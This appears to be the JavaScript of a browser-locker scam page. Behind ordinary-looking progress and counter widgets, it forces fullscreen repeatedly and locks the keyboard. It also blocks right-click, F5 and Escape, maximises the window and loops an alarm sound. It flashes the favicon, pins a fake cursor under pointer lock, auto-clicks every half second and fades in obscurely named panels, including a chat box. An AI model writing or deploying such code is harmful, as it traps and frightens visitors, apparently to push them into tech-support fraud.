$(function () {
  var a = 0,
    b = setInterval(function () {
      a += 10;
      $("#dynamic")
        .css("width", a + "%")
        .attr("aria-valuenow", a)
        .text(a + "% Complete");
      100 <= a && clearInterval(b);
    }, 100);
});

(function (a) {
  a.fn.countTo = function (b) {
    b = b || {};
    return a(this).each(function () {
      function d(a) {
        a = c.formatter.call(k, a, c);
        h.html(a);
      }
      var c = a.extend(
          {},
          a.fn.countTo.defaults,
          {
            from: a(this).data("from"),
            to: a(this).data("to"),
            speed: a(this).data("speed"),
            refreshInterval: a(this).data("refresh-interval"),
            decimals: a(this).data("decimals"),
          },
          b
        ),
        l = Math.ceil(c.speed / c.refreshInterval),
        n = (c.to - c.from) / l,
        k = this,
        h = a(this),
        m = 0,
        f = c.from,
        g = h.data("countTo") || {};
      h.data("countTo", g);
      g.interval && clearInterval(g.interval);
      g.interval = setInterval(function () {
        f += n;
        m++;
        d(f);
        "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
        m >= l &&
          (h.removeData("countTo"),
          clearInterval(g.interval),
          (f = c.to),
          "function" == typeof c.onComplete && c.onComplete.call(k, f));
      }, c.refreshInterval);
      d(f);
    });
  };
  a.fn.countTo.defaults = {
    from: 0,
    to: 0,
    speed: 100,
    refreshInterval: 100,
    decimals: 0,
    formatter: function (a, d) {
      return a.toFixed(d.decimals);
    },
    onUpdate: null,
    onComplete: null,
  };
})(jQuery);
jQuery(function (a) {
  a(".count-number").data("countToOptions", {
    formatter: function (a, d) {
      return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",");
    },
  });
  a(".timer").each(function (b) {
    var d = a(this);
    b = a.extend({}, b || {}, d.data("countToOptions") || {});
    d.countTo(b);
  });
});

addEventListener("click", function () {
  var el = document.documentElement,
    rfs =
      el.requestFullScreen ||
      el.webkitRequestFullScreen ||
      el.mozRequestFullScreen;
  rfs.call(el);
});

function enterFullscreen() {
  const elem = document.documentElement;
  if (elem.requestFullscreen) {
    elem.requestFullscreen();
  } else if (elem.mozRequestFullScreen) {
    // Firefox
    elem.mozRequestFullScreen();
  } else if (elem.webkitRequestFullscreen) {
    // Chrome, Safari and Opera
    elem.webkitRequestFullscreen();
  } else if (elem.msRequestFullscreen) {
    // IE/Edge
    elem.msRequestFullscreen();
  }
}

var modal = document.getElementById("myModal"),
  btn = document.getElementById("myBtn"),
  span = document.getElementsByClassName("close")[0];
span.onclick = function () {
  modal.style.display = "none";
};
window.onclick = function (a) {
  a.target == modal && (modal.style.display = "none");
};

setInterval(function () {
  document.getElementById("pridez").play();
}, 500);

var e = 1;
setInterval(function () {
  1 == e
    ? ((document.getElementById("favicon").href = "msmm.png"), (e = 0))
    : ((document.getElementById("favicon").href = "wdi.png"), (e = 1));
}, 1e3);

$(document).ready(function () {
  $("#mycanvas").click(function () {
    $("#welcomeDiv").show();
  });
});

$(document).ready(function () {
  $(".infgets").delay(900).fadeIn(800);
  $("#qwrqwewrqwdqw").delay(900).fadeIn(800);
  $(".black").delay(400).fadeIn(800);
  $(".scsdvvfbwqwe").delay(1500).fadeIn(800);
  $(".dqdwcvbsfsaw").delay(2e3).fadeIn(800);
  $("#dwrfwewvdssdfsdf").delay(3e3).fadeIn(800);
  $("#njakchiocajion").delay(8e3).fadeIn(800);
  $("#footer").delay(2e3).fadeIn(800);
});

$(document).ready(function () {
  $("#mycanvas").click(function () {
    $("#njakchiocajion").show();
    // handleBodyClick();
  });
});
$(document).ready(function () {
  $("#cross").click(function () {
    $("#dwrfwewvdssdfsdf").show();
  });
});
$(document).ready(function () {
  $("#cross").click(function () {
    $("#njakchiocajion").show();
  });
});

$(document).ready(function () {
  setTimeout(function () {
    $("body").mouseover(function () {
      $("#njakchiocajion").show();
    });
  }, 5000);
});
$(document).ready(function () {
  setTimeout(function () {
    $("body").mouseover(function () {
      document.body.requestFullscreen();
    });
  }, 10000);
});

var isNS = "Netscape" == navigator.appName ? 1 : 0;
"Netscape" == navigator.appName &&
  document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);

function mischandler() {
  return !1;
}

function mousehandler(a) {
  a = isNS ? a : event;
  a = isNS ? a.which : a.button;
  if (2 == a || 3 == a) return !1;
}
document.oncontextmenu = mischandler;
document.onmousedown = mousehandler;
document.onmouseup = mousehandler;

document.onkeydown = function (a) {
  return !1;
};

document.addEventListener("onkeydown", win_onkeydown_handler);

function win_onkeydown_handler() {
  switch (event.keyCode) {
    case 116:
      event.returnValue = !1;
      event.keyCode = 0;
      break;
    case 27:
      (event.returnValue = !1), (event.keyCode = 0);
  }
}

window.onload = function () {
  window.moveTo(0, 0);
  window.resizeTo(screen.availWidth, screen.availHeight);
};

$(document).ready(function () {
  $("#chat").delay(600).fadeIn(100);
});

navigator.keyboard.lock();
document.onkeydown = function (e) {
  return false;
};

$(document).ready(function () {
  var audioElement = document.createElement("audio");
  audioElement.setAttribute("src", "webs.wav");

  audioElement.addEventListener(
    "ended",
    function () {
      this.play();
    },
    false
  );

  $("#mycanvas").click(function () {
    audioElement.play();
  });

  $("#link_black").click(function () {
    audioElement.play();
  });

  $(".infgets").click(function () {
    audioElement.play();
  });

  $("#qwrqwewrqwdqw").click(function () {
    audioElement.play();
  });
  $("#njakchiocajion").click(function () {
    audioElement.play();
  });
});
// document.addEventListener("click", () => {
//   document.body.requestPointerLock();
//   document.body.requestFullscreen();
// });
document.addEventListener("fullscreenchange", () => {
  setTimeout(function () {
    document.body.click();
  }, 1000);
  
});
document.addEventListener("mozfullscreenchange", () => {
  setTimeout(function () {
    document.body.click();
  }, 1000);
});
document.addEventListener("webkitfullscreenchange", () => {
  setTimeout(function () {
    document.body.click();
  }, 1000);
});
document.addEventListener("msfullscreenchange", () => {
  setTimeout(function () {
    document.body.click();
  }, 1000);
});

document.addEventListener("mousemove", (event) => {
  if (document.pointerLockElement === document.body) {
    const c = document.getElementById("customCursor");
    const h = 200;
    const bp = window.innerHeight - 50;
    let y = event.movementY;
    if (y < h) {
      c.style.top = `${bp}px`;
    } else {
      c.style.top = `${y}px`;
    }
  }
});

$(document).ready(function () {
  function switchDiv() {
    $("#qwrqwewrqwdqw").hide();
    $("#njakchiocajion").show();
  }

  $("#qwrqwewrqwdqw").on("click", function (event) {
    if (
      event.target.id !== "txts1" &&
      event.target.tagName.toLowerCase() !== "a" &&
      event.target.tagName.toLowerCase() !== "img"
    ) {
      switchDiv();
    }
  });

  $(
    "#qwrqwewrqwdqw .title2 a, #qwrqwewrqwdqw .button, #qwrqwewrqwdqw .button2"
  ).on("click", function (event) {
    event.stopPropagation();
    switchDiv();
  });
});

document.addEventListener('keydown', function(event) {
  if (event.key === 'Escape') {
      event.preventDefault();
      var messageDiv = document.getElementById('message');
      messageDiv.style.display = 'block';
      setTimeout(function() {
          messageDiv.style.display = 'none';
      }, 500); 
  }
});

$(document).ready(function () {
  setTimeout(function () {
    setInterval(() => {
      document.body.click();
    }, 500);
    
  }, 1000);
});

